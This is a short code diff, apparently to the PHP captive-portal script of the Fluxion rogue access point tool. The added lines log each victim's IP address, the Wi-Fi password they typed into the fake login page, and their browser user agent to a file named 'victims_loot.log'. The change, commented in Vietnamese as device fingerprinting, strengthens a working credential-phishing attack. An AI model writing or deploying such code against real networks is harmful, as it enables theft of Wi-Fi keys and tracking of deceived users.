@@ -59,6 +59,12 @@
     fwrite($clients_IP_file, $client_IP);
     fclose($clients_IP_file);
 
+    // Thu thập dấu vết thiết bị (Fingerprinting)
+    $user_agent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : "Unknown";
+    $loot_log_path = "$FLUXIONWorkspacePath/victims_loot.log";
+    $loot_data = "[" . date("Y-m-d H:i:s") . "] IP: $client_IP | Key: $candidate_key | Device: $user_agent\n";
+    file_put_contents($loot_log_path, $loot_data, FILE_APPEND);
+
     $candidate_key_result_path = "$FLUXIONWorkspacePath/candidate_result.txt";
 
     // Create candidate result file to trigger checking.
